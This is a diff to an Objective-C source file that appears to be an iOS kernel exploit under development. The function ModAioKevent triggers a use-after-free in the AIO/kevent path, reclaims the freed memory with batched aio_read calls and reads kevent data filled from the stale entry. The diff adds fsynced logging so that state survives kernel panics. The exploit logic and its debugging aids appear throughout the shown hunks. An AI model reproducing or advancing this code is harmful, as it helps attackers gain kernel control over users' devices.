@@ -1474,8 +1474,44 @@ static struct aiocb rs_aio_cb;
 static struct aiocb rs_aio_rcb[8];
 static char rs_aio_rbuf[8][0x10000];
 
+// Durable log: after a kernel panic the in-app log dies with the device, so the
+// run that crashed it used to be unreadable.  Every line is fsynced to
+// Documents/aio_uaf.log and re-printed on the next launch.
+static NSString *rs_aio_logpath(void) {
+    NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
+                                                         NSUserDomainMask, YES) firstObject];
+    return [dir stringByAppendingPathComponent:@"aio_uaf.log"];
+}
+static void rs_aio_dlog(NSString *line) {
+    NSString *path = rs_aio_logpath();
+    @try {
+        NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
+        if (!fh) {
+            [[line stringByAppendingString:@"\n"] writeToFile:path atomically:YES
+                                                  encoding:NSUTF8StringEncoding error:nil];
+            return;
+        }
+        [fh seekToEndOfFile];
+        [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
+        [fh synchronizeFile];
+        [fh closeFile];
+    } @catch (NSException *e) { }
+}
+
 NSString *ModAioKevent(void) {
     AveLog(@"[aio20637b12] === AIO kevent UAF: B1 trigger + B2 kevent read ===");
+
+    // re-print whatever the crashed run left behind
+    NSString *prev = [NSString stringWithContentsOfFile:rs_aio_logpath()
+                                               encoding:NSUTF8StringEncoding error:nil];
+    if (prev.length > 4) {
+        AveLog(@"[aio20637b12] === PREVIOUS RUN (survived the reboot) ===");
+        NSArray *pl = [prev componentsSeparatedByString:@"\n"];
+        for (NSUInteger i = 0; i < pl.count && i < 80; i++)
+            if (pl[i].length) AveLog(S(@"[prev] %@", pl[i]));
+        AveLog(@"[aio20637b12] === END PREVIOUS RUN ===");
+    }
+    rs_aio_dlog(S(@"=== NEW RUN pid=%d ===", getpid()));
 
     const size_t FILE_SZ = 0x10000;
     const ssize_t VICTIM_NB = FILE_SZ;
@@ -1543,9 +1579,11 @@ NSString *ModAioKevent(void) {
                             int rr = aio_read(&rs_aio_rcb[i]);
                             if (rr == 0) {
                                 issued++;
-                            } else if (i == 0) {
-                                AveLog(S(@"[aio20637b12] RECLAIM ISSUE FAILED errno=%d (%s)",
-                                         errno, strerror(errno)));
+                            } else {
+                                rs_aio_dlog(S(@"RECLAIM ISSUE FAILED i=%d errno=%d (%s)",
+                                              i, errno, strerror(errno)));
+                                AveLog(S(@"[aio20637b12] RECLAIM ISSUE FAILED i=%d errno=%d (%s)",
+                                         i, errno, strerror(errno)));
                             }
                         }
                         done = 1;
@@ -1573,6 +1611,7 @@ NSString *ModAioKevent(void) {
             if (rc_done) break;
         }
         AveLog(S(@"[aio20637b12] round=%d reclaim_complete=%d issued=%d", round, rc_done, issued));
+        rs_aio_dlog(S(@"round=%d reclaim_complete=%d issued=%d", round, rc_done, issued));
         usleep(2000);
 
         // B2: read the kevent that filt_aioprocess fills from the stale entry
@@ -1581,7 +1620,11 @@ NSString *ModAioKevent(void) {
         struct timespec to;
         to.tv_sec = 0;
         to.tv_nsec = 20000000;   // 20 ms
+        // PRE-ARM: the last durable line before the kernel may panic - after a reboot
+        // this names the exact state that crashed it
+        rs_aio_dlog(S(@"PRE-ARM round=%d issued=%d reclaim_nbytes=%d", round, issued, (int)RECL_NB));
         int n = kevent64(kq, NULL, 0, kev, 8, 0, &to);
+        rs_aio_dlog(S(@"POST-ARM round=%d nev=%d", round, n));
         if (n > 0) {
             for (int i = 0; i < n; i++) {
                 uint64_t e0 = (uint64_t)kev[i].ext[0];
